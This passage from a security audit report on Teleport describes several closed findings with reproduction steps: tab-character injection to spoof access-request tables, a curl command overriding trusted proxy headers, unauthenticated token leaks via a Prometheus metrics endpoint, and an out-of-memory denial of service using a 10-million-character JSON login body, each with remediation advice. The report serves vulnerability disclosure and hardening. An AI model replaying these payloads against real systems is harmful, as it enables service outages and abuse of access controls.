\nattacker to inject arbitrary content, spooﬁng multiple subsequent lines in the CLI table, in the context of a \nsocial engineering or phishing attack. \n\nReproduction Steps \n\nIn the following example, an attacker (\"phos\") already has a valid account on the platform and is able to \nrequest the targeted admin role (through their request-enabled role). \n\n1. The attacker ﬁrst requests the elevation to their targeted role, obtaining a new request token: \n\n$ tsh login --proxy doyensec-2020.gravitational.io:3080 --user phos --request-\nroles admin --request-reason \"preposterous request\" \nSeeking request approval... (id: e40d8510-4388-4d4a-8f99-82c464dcdd16) \n\n37\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n2. By crafting a request reason with a calculated number of tabulation (U+0009) and double quotation \nmark characters (U+201C), the attacker injects the previously assigned token of the ﬁrst request in a \nnew line of the table, forging a seemingly trusted user elevation request: \n\n$ tsh login --proxy doyensec-2020.gravitational.io:3080 --user phos --request-\nroles basic --request-reason \"1st routine operation” (\\t*10) \ne40d8510-4388-4d4a-8f99-82c464dcdd16 devop1 roles=basic 17 Nov 20 16:10 UTC \nPENDING request=“2nd routine operation\" \n\nWhen the approval workﬂow is ﬁnalized by a Teleport admin, the UUID can be easily confused when \nusing the tctl request approve command: \n\nIn the attack described above, a Teleport admin approving routine requests is tricked into approving \nan injected request (apparently from \"devop1\") including an evil UUID token (\"e40d8510-4388- \n4d4a-8f99-82c464dcdd16\"). \n\nImpact \n\nIn a successful attack scenario, an attacker could craft a credible line on the elevation requests table. \nThis could be used to simulate inconspicuous elevation requests with an arbitrary token, requestor, \nmetadata, creation dates, and status. \n\nComplexity \n\nThe complexity of crafting the exploit is trivial. However, the payload must be carefully crafted to keep the \ntable's formatting and appropriate content must be chosen to simulate inconspicuous operations (e.g. \nroutine elevations from the DevOps team), using social engineering techniques. The attacker should also \nown a valid account and the elevation request should also be allowed by the account's assigned role. \n\nRemediation \n\nLimit the length and the charset of the requesters' reasons (e.g. /^[\\w @\\/()]{0,60}$/). \n\nResources \n\n- \"Content Spooﬁng\", OWASP Community Guides \n\nhttps://owasp.org/www-community/attacks/Content_Spooﬁng \n\n38\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-12 AAP Headers Injection\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nLow\n\nInjection Flaws (SQL, XML, Command, Path, etc)\n\nlib/srv/app/transport.go:160\n\nClosed\n\nTeleport applies several rewriting rules to AAP requests before they are forwarded to the application. The \nHTTP roundtripper (:114) auditing incoming requests parses the targeted host address, checks if the \nrequest should be redirected to a different path, and ﬁnally passes the edited request to the application \nemitting the event to the audit log. \n\nThe Doyensec team discovered that an attacker is able to fully overwrite or inject the Cf-Access-Tokens, \nTeleport-Jwt-Assertion, X-Forwarded-For, X-Forwarded-Host, and X-Forwarded-Proto headers \ndelivered to the AAP application. Because of this, reserved headers set and passed to the AAP application \nby Teleport AAP can't be considered as fully trusted. The issue's severity is mitigated by the fact that the \nCf-Access-Tokens and Teleport-Jwt-Assertion authentication tokens are signed, therefore, only \nexposing the application to risks of assertion re-use and signature bypass bugs. \n\nReproduction Steps \n\nAfter obtaining a valid grv_app_session cookie, using e.g. curl it is possible to set arbitrary headers \nvalues: \n\ncurl 'https://test.doyensec-2020.gravitational.io:3080/test' \\ \n -H 'Connection: keep-alive' \\ \n -H 'Cf-Access-Token: ey...FAKE.INJECTED.JWT' \\ \n -H 'Teleport-Jwt-Assertion: ey...FAKE.INJECTED.JWT2' \\ \n -H 'X-Forwarded-For: 127.0.0.1' \\ \n -H 'X-Forwarded-Host: another-server' \\ \n -H 'X-Forwarded-Proto: another-protocol' \\ \n -H 'Cookie: grv_app_session=e4cd36952112d1d7b827e9f78f16714a3db17b0c...' \\ \n --compressed ; \n\nWhile all the provided headers will overwrite any legit corresponding header, X-Forwarded-For will only \nappend the passed IP value: \n\nGET /test HTTP/1.1 \nHost: 127.0.0.1:8087 \nUser-Agent: curl/7.64.1 \nAccept: */* \nCf-Access-Token: ey...FAKE.INJECTED.JWT \nTeleport-Jwt-Assertion: ey...FAKE.INJECTED.JWT2 \n\n39\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nX-Forwarded-For: 127.0.0.1, 34.209.123.10, 34.229.123.20 \nX-Forwarded-Proto: custom-protocol \nX-Forwarded-Host: custom-host \nX-Forwarded-Server: true-server \n\nImpact \n\nBy injecting custom headers, an attacker is able to override some headers set by Teleport's AAP \nroundtripper. This may increase the risk of log spooﬁng, leaked JWT session re-use, or signature bypass. \n\nComplexity \n\nLow. An attacker only needs to have a valid grv_app_session cookie in order to exploit the issue. \n\nRemediation \n\nDon’t allow user-provided headers to override any headers set by Teleport's AAP. Headers set by Teleport \nshould be considered trusted by the web application. \n\n40\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-13 Unprotected Prometheus Diagnostic Endpoint\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nLow\n\nInsufﬁcient Authentication and Session \nManagement\n\nlib/service/service.go:1911\n\nClosed\n\nTeleport Prometheus is a service embedded in every Teleport server for monitoring purposes. The service \nis disabled by default, but it is possible to enable it by using the --diag-addr. While being an opt-in \nfeature, this metrics utility is available without any form of authentication, returning the full, un-redacted \ntokens along with many other Prometheus metrics metadata through the /metrics endpoint available \nover HTTP. \n\nSeveral scenarios could allow an unprivileged user to leak the tokens through the utility: \n\n- A Server-Side Request Forgery (SSRF) attack vector on the Teleport server returning content (e.g. \n\nTEL-Q420-10) \n\n- A user having non-root access to the Teleport server, manually fetching the metrics page \n- A misconﬁgured AAP application on the Teleport server is reassigned to the Teleport Prometheus \n\nservice port. \n\n8\n\nAs detailed by the Prometheus security page , \"It is presumed that untrusted users have access to the \nPrometheus HTTP endpoint and logs. [...] Secrets from other sources may end up exposed due to code \noutside of our control or due to functionality that happens to expose wherever it is stored\". Additionally, as \npreviously highlighted by Cure53's penetration test in the PRM-01-002 ﬁnding: \"Currently the approach \ndeployed by Prometheus is to rely on a perimeter security rather than to implement security on an in-depth \nlevel. This may have severe implications for setting up a Prometheus instance and, in addition, can make \nthe deployment model characterized by having a single point of failure\". \n\n9\n\nIt is important to notice that no warnings on the ofﬁcial documentation are also present to highlight these \nrisks , \n\n10 11\n\n. \n\nReproduction Steps \n\nAny unauthenticated request to the /metrics endpoint of the Metrics service will return the list of internal \nmetrics that Teleport is tracking, in the Prometheus exportable format. The endpoint will also return un-\n\n https://prometheus.io/docs/operating/security/ \n8\n\n https://prometheus.io/assets/downloads/2018-06-11--cure53_security_audit.pdf \n9\n\n10\n\n https://goteleport.com/teleport/docs/admin-guide/#troubleshooting \n\n11\n\n https://goteleport.com/teleport/docs/metrics-logs-reference/ \n\n41\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nredacted tokens for password resets, application, node, role invitation requests, internal roles and \nclusters, etc: \n\n... \nbackend_requests{component=\"cache\",range=\"false\",req=\"/roles/admin\"} 19 \nbackend_requests{component=\"cache\",range=\"false\",req=\"/roles/reservedrole1\"} 5 \nbackend_requests{component=\"cache\",range=\"false\",req=\"/roles/reservedrole2\"} 12 \nbackend_requests{component=\"cache\",range=\"false\",req=\"/tokens/\na2aa240d9fb219fc104e143d50de72d4\"} 1 \nbackend_requests{component=\"backend\",range=\"false\",req=\"/tokens/\n6eeed396c3a8fe7e64c4e18f688a1bfa\"} 1 \nbackend_requests{component=\"backend\",range=\"false\",req=\"/access_requests/\n7bd78c59-a34f-4057-aaee-7fd23bfedc85\"} 1 \nbackend_requests{component=\"backend\",range=\"false\",req=\"/kubeServices/11ac9da3-\nc27b-488b-944a-19896ad9f28b-proxy_service\"} 3 \nbackend_requests{component=\"backend\",range=\"false\",req=\"/proxies/11ac9da3-\nc27b-488b-944a-19896ad9f28b\"} 2 \nbackend_requests{component=\"backend\",range=\"true\",req=\"/tunnelConnections/\ndoyensec-leaf\"} 1 \nbackend_requests{component=\"cache\",range=\"false\",req=\"/authservers/11ac9da3-\nc27b-488b-944a-19896ad9f28b\"} 9 \nbackend_requests{component=\"cache\",range=\"false\",req=\"/authservers/\n54b60715-78e8-43ff-91e9-3ca1656a01c5\"} 3 \n\nImpact \n\nHigh. An attacker with access to the metrics endpoint could read the metric data and abuse the unused \ntokens or metadata. Only the core Prometheus service should be allowed to read the metric data. \n\nComplexity \n\nThe complexity of the attack can vary, but since the metrics service is usually only exposed to a local port \nan attacker would need a way to issue a request and read its response. \n\nRemediation \n\nThe metric endpoint should be available to authenticated clients only. If this is not possible, resource \ntokens should be partially redacted to limit the exﬁltration risk. \n\nAll in all, clear and speciﬁc documentation is needed to make sure that developers, admins, and users of \nTeleport are aware of the fact that they must keep this endpoint secure on their end. The website hosting \nthe Teleport documentation should clearly state the risks of enabling the Metrics service across various \nsecurity realms. \n\n42\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-14 CA Pinning Does Not Check Certiﬁcate Expiration Date\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nInformational\n\nInsufﬁcient Cryptography\n\nlib/auth/register.go:169\n\nClosed\n\nWhen a Node or Proxy is running on different hosts than the Auth Server, a security-critical veriﬁcation is \nneeded to prove that a valid Auth Server was used to issue the joining request (achieved with the join \ntoken) as well as to validate the Auth Server (achieved with a SHA256 CA pin). \n\nThe pinRegisterClient function in lib/auth/register.go:169 is the one performing this last \nveriﬁcation, since it connects to the Auth Server using an insecure connection to fetch the root CA and \nthen match it with the provided CA pin (using the pinRegisterClient function). If the root CA matches \nthe provided CA pin, a connection will be re-established and the root CA will be used to validate the \npresented certiﬁcate: \n\nfunc pinRegisterClient(params RegisterParams) (*Client, error) { \n // Build a insecure client to the Auth Server. This is safe because even if \n // an attacker were to MITM this connection the CA pin will not match below. \n tlsConfig := utils. TLSConfig(params.CipherSuites) \n tlsConfig.InsecureSkipVerify = true \n client, err := NewTLSClient(ClientConfig{Addrs: params.Servers, TLS: \ntlsConfig}) \n if err != nil { \n\nreturn nil, trace.Wrap(err) \n\n } \n defer client. Close() \n\n // Fetch the root CA from the Auth Server. The NOP role has access to the \n // GetClusterCACert endpoint. \n localCA, err := client. GetClusterCACert() \n if err != nil { \n\nreturn nil, trace.Wrap(err) \n\n } \n tlsCA, err := tlsca. ParseCertificatePEM(localCA.TLSCA) \n if err != nil { \n\nreturn nil, trace.Wrap(err) \n\n } \n\n // Check that the SPKI pin matches the CA we fetched over a insecure \n // connection. This makes sure the CA fetched over a insecure connection is \n // in-fact the expected CA. \n err = utils.CheckSPKI(params.CAPin, tlsCA) \n if err != nil { \n\nreturn nil, trace.Wrap(err) \n\n } \n\n log. Infof(\"Joining remote cluster %v with CA pin.\", \ntlsCA.Subject.CommonName)?...?} \n\n43\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nIn order to do so, the InsecureSkipVerify ﬂag is set to accept any certiﬁcate presented by the server \nand any hostname in that certiﬁcate. Since setting the ﬂag will also not call the isValid() function \nof x509 Verify() , used to check the certiﬁcate expiration status , nor the VerifyHostname() \n14\nDNSName veriﬁcation, the registration will also accept expired or mismatched certiﬁcates. \n\n13\n\n12\n\nSince the default lifetime of a CA certiﬁcate for an Auth Server is currently set to 10 years, any introduced \nexpiration check should come together with a lowered TTL, allowing for ﬁner grain certiﬁcate validation: \n\nconst CATTL = time.Hour * 24 * 365 * 10 \n\nReproduction Steps \n\nWhile in a normal Go certiﬁcate validation (Verify), the isValid function performs validity checks on a \nprovided certiﬁcate: \n\nfunc (c *Certificate) isValid(certType int, currentChain []*Certificate, opts \n*VerifyOptions) error { \n if len(c.UnhandledCriticalExtensions) > 0 { \n\nreturn UnhandledCriticalExtension{} \n\n } \n\n if len(currentChain) > 0 { \n\nchild := currentChain[ len(currentChain)-1] \nif !bytes. Equal(child.RawIssuer, c.RawSubject) { \n\nreturn CertificateInvalidError{c, NameMismatch, \"\"} \n\n} \n\n } \n\n now := opts.CurrentTime \n if now. IsZero() { \n\nnow = time. Now() \n\n } \n if now. Before(c.NotBefore) { \n\nreturn CertificateInvalidError{ \n\nCert: c, \nReason: Expired, \nDetail: fmt. Sprintf(\"current time %s is before %s\", \n\nnow.Format(time.RFC3339), c.NotBefore.Format(time.RFC3339)), \n\n} \n\n } else if now. After(c.NotAfter) { \n\nreturn CertificateInvalidError{ \n\nCert: c, \nReason: Expired, \nDetail: fmt. Sprintf(\"current time %s is after %s\", \n\nnow.Format(time.RFC3339), c.NotAfter.Format(time.RFC3339)), \n\n} \n\n } \n... \n} \n\nAs detailed in the Description section, when the InsecureSkipVerify is set, crypto/tls won't call \nVerify on it. In this mode, TLS is susceptible to machine-in-the-middle attacks unless strict custom \n\n12\n\n https://golang.org/src/crypto/x509/verify.go#L729 \n\n13\n\n https://golang.org/src/crypto/x509/verify.go#L575 \n\n14\n\n https://golang.org/src/crypto/x509/verify.go#L1037 \n\n44\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nveriﬁcation is used. \n\nThis custom veriﬁcation is implemented in the utils.CheckSPKI function (lib/utils/spki.go). \nHere the SHA256 hash value of the SPKI header in the certiﬁcate is calculated using cert. \nRawSubjectPublicKeyInfo, which is the DER-encoded SubjectPublicKeyInfo, but no expiration \n(isValid) or DNSName veriﬁcation mechanisms are in place (VerifyHostname): \n\nfunc CalculateSPKI(cert *x509.Certificate) string { \n sum := sha256. Sum256(cert.RawSubjectPublicKeyInfo) \n return \"sha256:\" + hex.EncodeToString(sum[:]) \n} \n\nImpact \n\nWhile many certiﬁcate validation mechanisms (chain validation, name constraints validation, EKUs \nvalidation, revocation checking) are intentionally left out because of Teleport's design, a certiﬁcate \nexpiration check should be enforced since certiﬁcate expiration has various advantages from the security \nstandpoint. After discussion with the Teleport team, the actual risk was determined to be residual. This is \nbecause the CA pinning is manually set by the user and enforced only on the ﬁrst registration of a Node or \na Proxy. Since only the public key of the Subject is pinned, an attacker in possession of a leaked key pair \ncould easily forge a valid certiﬁcate to use in their MITM attack. Nonetheless, implementing ﬁner-grained \nvalidation while setting a default lower TTL for CA certiﬁcates could highlight such impersonation efforts \nwhile enforcing better certiﬁcate security practices on Teleport users. \n\nComplexity \n\nHigh. An attacker should be able to re-use a leaked private key or an expired certiﬁcate. \n\nRemediation \n\nPerform expiration checks on the certiﬁcate returned during the ﬁrst connection by the authentication \nserver. Lower the default TTL for a CA to 1 year and implement automatic rotation through the \nRotateCertAuthority function (lib/auth/rotate.go:204). \n\nWe consider this issue as a potential hardening improvement. \n\nResources \n\n- \"Package x509\", Golang Documentation Reference \n\nhttps://golang.org/pkg/crypto/x509/ \n\n45\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-15 Unauthenticated OOM DoS in ReadJSON\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nHigh\n\nDenial of Service (DoS)\n\n/lib/httplib/httplib.go\n\nClosed\n\nThe Teleport Web server is using the package httplib to leverage common or recurring utility functions \nfor writing HTTP handlers. One of these utilities is the ReadJSON function: \n\n// ReadJSON reads HTTP json request and unmarshals it \n// into passed interface{} obj \nfunc ReadJSON(r *http.Request, val interface{}) error { \n data, err := ioutil. ReadAll(r.Body) \n if err != nil { \n\nreturn trace. Wrap(err) \n\n } \n if err := json. Unmarshal(data, &val); err != nil { \n\nreturn trace. BadParameter(\"request: %v\", err.Error()) \n\n } \n return nil \n} \n\nThis function is used throughout every endpoint to parse the incoming JSON and deserialize it: \n\n- /e/lib/web/access_request.go (:22) \n- /e/lib/web/handler.go (:78) \n- /e/lib/web/users.go (:60, :88) \n- /lib/auth/apiserver.go (:329, :384, :401, :548, :598, :616, :736, ...) \n- /lib/web/apiserver.go (:882, :961, :1197, :1291, 1219, 1404, ...) \n- /lib/web/apps.go (:91) \n- /lib/web/password.go (:47, :74) \n- /lib/web/saml.go (:72) \n\nWhen attempting to read the request body data, the function will read in the incoming JSON and attempt \nto perform the deserialization. This results in the entire JSON being loaded into memory from a remote \nnetwork request. This is particularly dangerous since some Teleport API endpoints are exposed to \nunauthenticated users. An attacker could abuse this implementation to load large chunks of content into \nthe server's memory, causing an Out-Of-Memory (OOM) error condition and the consequent forceful \nrestart of the Teleport process. Every major Teleport version is affected by the issue and is exploitable \nfrom an unauthenticated attacker's position. \n\nReproduction Steps \n\nA weaponized example of this has been reproduced leveraging the login endpoint at /v1/webapi/\nsessions. The following reproduction steps use the Burp Suite Intruder tool, but a similar Proof-of-\n\n46\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nConcept can be achieved programmatically: \n\n1. Set up a transparent proxy on the user agent and visit the targeted Teleport web platform \n2. Simulate and intercept a login action \n3. Send the intercepted request to Burp's Intruder tool, setting the Sniper attack type. The request should \n\nbe similar to this: \n\nPOST /v1/webapi/sessions HTTP/1.1 \nHost: doyensec-2020.gravitational.io:3080 \nConnection: close \n\n{\"user\":\"alice\",\"pass\":\"§hunter2§\",\"second_factor_token\":\"\"} \n\n4. Set the payload markers (§) in one of the properties' values and launch the attack after setting the \n\"Character Block\" payload type, specifying e.g. the \"A\" character as a base string and inserting the \nsame minimum and maximum length as e.g. 10,000,000 (10 million). This setup will produce the \nfollowing HTTP request: \n\nPOST /v1/webapi/sessions HTTP/1.1 \nHost: doyensec-2020.gravitational.io:3080 \nConnection: close \n\n{\"user\":\"alice\",\"pass\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... \n*10,000,000\",\"second_factor_token\":\"\"} \n\n5. After a few seconds the Teleport process on the server will crash and will be forcefully restarted by \n\nthe systemd supervisor: \n\nteleport[28896]: fatal error: runtime: out of memory \nsystemd[1]: teleport.service: main process exited, code=exited, status=2/\nINVALIDARGUMENT \nteleport[28896]: runtime stack: \nteleport[28896]: runtime.throw(0x29501f4, 0x16) \nteleport[28896]: /opt/go/src/runtime/panic.go:1116 +0x72 \nteleport[28896]: runtime.sysMap(0xc00c000000, 0x8000000, 0x412dd78) \nteleport[28896]: /opt/go/src/runtime/mem_linux.go:169 +0xc6 \nteleport[28896]: runtime.(*mheap).sysAlloc(0x4111380, 0x8000000, 0x43c4b7, \n0x4111388) \nteleport[28896]: /opt/go/src/runtime/malloc.go:727 +0x1e5 \nteleport[28896]: runtime.(*mheap).grow(0x4111380, 0x4000, 0x0) \nteleport[28896]: /opt/go/src/runtime/mheap.go:1344 +0x85 \nteleport[28896]: runtime.(*mheap).allocSpan(0x4111380, 0x4000, 0x78e1345280100, \n0x412dd88, 0x200000002) \nteleport[28896]: /opt/go/src/runtime/mheap.go:1160 +0x6b6 \nteleport[28896]: runtime.(*mheap).alloc.func1() \nteleport[28896]: /opt/go/src/runtime/mheap.go:907 +0x65 \nteleport[28896]: runtime.(*mheap).alloc(0x4111380, 0x4000, 0xc000c20101, \n0xc0012a0180) \nteleport[28896]: /opt/go/src/runtime/mheap.go:901 +0x85 \nteleport[28896]: runtime.largeAlloc(0x7fffe00, 0x7f8674ef0101, 0x451d29) \nteleport[28896]: /opt/go/src/runtime/malloc.go:1177 +0x92 \nteleport[28896]: runtime.mallocgc.func1() \nteleport[28896]: /opt/go/src/runtime/malloc.go:1071 +0x46 \nteleport[28896]: runtime.systemstack(0xc0012a0180) \n\n47\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nteleport[28896]: /opt/go/src/runtime/asm_amd64.s:370 +0x66 \nteleport[28896]: runtime.mstart() \nteleport[28896]: /opt/go/src/runtime/proc.go:1116 \nteleport[28896]: goroutine 1610 [running]: \nteleport[28896]: runtime.systemstack_switch() \nteleport[28896]: /opt/go/src/runtime/asm_amd64.s:330 fp=0xc0017e5178 \nsp=0xc0017e5170 pc=0x47eb00 \nteleport[28896]: runtime.mallocgc(0x7fffe00, 0x24a7660, 0x1201, 0x1234) \nteleport[28896]: /opt/go/src/runtime/malloc.go:1070 +0x938 fp=0xc0017e5218 \nsp=0xc0017e5178 pc=0x41e358 \nteleport[28896]: runtime.makeslice(0x24a7660, 0x7fffe00, 0x7fffe00, 0xc0017e52c8) \nteleport[28896]: /opt/go/src/runtime/slice.go:98 +0x6c fp=0xc0017e5248 \nsp=0xc0017e5218 pc=0x45f58c \nteleport[28896]: bytes.makeSlice(0x7fffe00, 0x0, 0x0, 0x0) \nteleport[28896]: /opt/go/src/bytes/buffer.go:229 +0x73 fp=0xc0017e5288 \nsp=0xc0017e5248 pc=0x52d3f3 \nteleport[28896]: bytes.(*Buffer).grow(0xc0017e5380, 0x200, 0x1234) \nteleport[28896]: /opt/go/src/bytes/buffer.go:142 +0x156 fp=0xc0017e52d8 \nsp=0xc0017e5288 pc=0x52cd16 \nteleport[28896]: bytes.(*Buffer).ReadFrom(0xc0017e5380, 0x7f8676cded78, \n0xc000b376c0, 0x7f8676cded78, 0xc00098c968, 0x8) \nteleport[28896]: /opt/go/src/bytes/buffer.go:202 +0x48 fp=0xc0017e5348 \nsp=0xc0017e52d8 pc=0x52d1c8 \nteleport[28896]: io/ioutil.readAll(0x7f8676cded78, 0xc000b376c0, 0x200, 0x0, 0x0, \n0x0, 0x0, 0x0) \nteleport[28896]: /opt/go/src/io/ioutil/ioutil.go:36 +0xe5 fp=0xc0017e53c8 \nsp=0xc0017e5348 pc=0x5d3fe5 \nteleport[28896]: io/ioutil.ReadAll(...) \n\n... \n\nteleport[28896]: github.com/gravitational/teleport/lib/service.\n(*TeleportProcess).onExit.func1(0x24a73e0, 0xc0015463f0) \nteleport[28896]: /go/src/github.com/gravitational/teleport/lib/service/\nservice.go:1382 +0xd1 \nteleport[28896]: github.com/gravitational/teleport/lib/service.\n(*LocalService).Serve(0xc001523820, 0x294a2c1, 0x14) \nteleport[28896]: /go/src/github.com/gravitational/teleport/lib/service/\nsupervisor.go:450 +0x2a \nteleport[28896]: github.com/gravitational/teleport/lib/service.\n(*LocalSupervisor).serve.func1(0xc00044e900, 0x2d3d440, 0xc001523820) \nteleport[28896]: /go/src/github.com/gravitational/teleport/lib/service/\nsupervisor.go:242 +0x31f \nteleport[28896]: created by github.com/gravitational/teleport/lib/service.\n(*LocalSupervisor).serve \nteleport[28896]: /go/src/github.com/gravitational/teleport/lib/service/\nsupervisor.go:237 +0x6e \nteleport[28896]: goroutine 1706 [select]: \nteleport[28896]: net/http.(*persistConn).writeLoop(0xc0012d06c0) \nteleport[28896]: /opt/go/src/net/http/transport.go:2340 +0x11c \nteleport[28896]: created by net/http.(*Transport).dialConn \nteleport[28896]: /opt/go/src/net/http/transport.go:1709 +0xcdc \nsystemd[1]: teleport.service holdoff time over, scheduling restart \n\nImpact \n\nDepending on the supervisor's restart policy set up on the machine, the Teleport's process could crash or \nbe killed, leading to a considerable downtime of the service in case of a prolonged attack. \n\n48\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nComplexity \n\nLow. An attacker only needs to ﬁre an unauthenticated request to any endpoint accepting JSON request \nbodies. \n\nRemediation \n\nAvoid loading arbitrary data into memory regardless of the size. Limit the size of a valid JSON tree and \nreturn an error closing the connection when it consumes a substantial amount of memory, especially for \nunauthenticated remote endpoints. \n\nResources \n\n- \"Be careful with ioutil.ReadAll in Golang\", Haisum Bhatti \n\nhttps://haisum.github.io/2017/09/11/golang-ioutil-readall/ \n\n49\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-16 Multiple Unhandled Errors\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nInformational\n\nInsecure Design\n\nlib/utils/syslog.go \nlib/srv/reexec.go \nlib/reversetunnel/srv.go \nlib/reversetunnel/remotesite.go \nlib/events/auditlog.go\n\nClosed\n\nImproper handling of errors can introduce a variety of security problems. These errors must be handled \naccording to a well thought out scheme that provides a meaningful error message to Teleport admins/\nSRE teams and logs diagnostic information to the service maintainers. This design is particularly \nimportant for functions used within the audit trail functionality of the platform. Such errors could also be \nabused by attackers to trigger a Denial of Service (DoS) condition or they could leave the system in a \npotentially insecure or fail-open state. \n\nDoyensec performed a detailed code review searching the code for error handling logic issues. While a \nconsistent \nlevels and \ntechnologies, some unexpected errors could potentially not be traced on the server-side: \n\nis present throughout the codebase using different \n\nlogging organization \n\nA. The SwitchLoggingtoSyslog function (lib/utils/syslog.go) call tells the logger to send the \noutput to syslog. This function is called in onSCP (tool/teleport/common/teleport.go:242), which \nimplements handling of 'scp' requests on the server-side. Errors returned by this function are not \nhandled and may lead to incomplete logging. \n\nB. The RunAndExit function (lib/srv/reexec.go:323) will run the requested command and then exit. \nThis is used when a subcommand is run, e.g. for \"exec\" or \"shell\" requests over a \"session\" channel \non Teleport nodes. In case the command fails to launch and an error occurs on line 323 (io.Copy(w, \nbytes.NewBufferString(s))), this will lead to incomplete logging. \n\nC. The removeSite function in lib/reversetunnel/srv.go:344 is called by the disconnectClusters \nfunction to disconnect reverse tunnel connections from remote clusters that were deleted from the \nlocal cluster side. This is done without checking for any returned errors. \n\nD. The DeleteTunnelConnection call in lib/reversetunnel/remotesite.go:300 is called to delete \nthe connection record to let know peer proxies that a speciﬁc node lost the connection and needs to \nbe discovered. No warning or error is issued in case this fails. \n\nE. The downloadSession function of the events package (lib/events/auditlog.go) is used to \ndownload a recording of a given session. On line :666 the os.Remove call is used to remove any \npartially downloaded tarball from the disk, but no exception or remediation action is handled if this \nfails. \n\n50\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nReproduction Steps \n\nReproduction steps are rather different for each vulnerable code path. While it was not always possible to \nrecover a fully functional proof of concept (PoC) exploit for all the unhandled errors enumerated in the \nDescription section of the ﬁnding, some common triggering conditions can be identiﬁed: \n\nIf the syslog (Logrus-based) structured logger can't be initialized or is not available for some reason \nIf the requested command fails to launch and the io.Writer's copy invocation fails \n\nA.\nB.\nC. When the remote cluster should be deleted, disconnecting it from the proxy, but the passed cluster is \n\nnot found \nIf the provided cluster or connection name is missing or the PresenceService deletion fails for some \nreason \nIf a session tarball download fails and an I/O error does not allow the removal of it from storage \n\nD.\n\nE.\n\nImpact \n\nProper error handling is an essential requirement of secure software. This issue has been reported as \n“Informational\" severity since it is a security hardening recommendation. \n\nComplexity \n\nFrom a technical standpoint, these vulnerabilities are relatively easy to discover but exploitation does \nrequire a good understanding of the overall Teleport infrastructure design. For these reasons, we consider \nthis issue as a departure from best practices with a minimal security impact. \n\nRemediation \n\nEnsure that the platform is built to gracefully handle all possible errors. In the implementation, the \napplication should keep track of failures and log alerts for sensible operations. In some cases, \nadditional actions could be performed in response to errors. \n\nFor a complete list of affected functions discovered during the engagement, please refer to the \nDescription section above. \n\nResources \n\n- \"CWE-755: Improper Handling of Exceptional Conditions\", MITRE Individual Dictionary Deﬁnition \n\nhttps://cwe.mitre.org/data/deﬁnitions/755.html \n\n51\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-17 Token Exposure Through Open Redirect Bypass In AAP \nAuthentication Flow\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nHigh\n\nInsecure Design\n\nlib/web/apps.go\n\nClosed\n\nWhen Teleport users want to connect to an AAP application, it is possible for them to visit the Teleport \nweb UI and click on any of the installed applications. This will redirect them to a launch URL in the form \nof: \n\n/web/launch/:fqdn/:clusterId/:publicAddr \n\nWhere the FQDN, cluster name, and public address values for the chosen application are included as part \nof the URL. These parameters are then used to build a POST request to /v1/webapi/sessions/app, \nwhich will return a session token for the application identifying the user (e.g. sampleapp.doyensec- \n2020.gravitational.io): \n\nPOST /v1/webapi/sessions/app HTTP/1.1 \nHost: doyensec-2020.gravitational.io:3080 \nAccept: application/json \nX-CSRF-Token: a1b2c3d4e5f6h7i8j... \nAuthorization: Bearer a1b2c3d4e5f6h7i8j... \nContent-Length: 153 \nConnection: close \nCookie: grv_csrf=a1b2c3d4e5f6h7i8j...; session=a1b2c3d4e5f6h7i8j... \n\n{ \n \"fqdn\": \"sampleapp.doyensec-2020.gravitational.io\", \n \"cluster_name\": \"doyensec-2020\", \n \"public_addr\": \"sampleapp.doyensec-2020.gravitational.io\" \n} \n\nWhere fqdn is the fully qualiﬁed domain name, public_addr is the public address, and cluster_name is \nthe cluster within which this application is running. In the context of 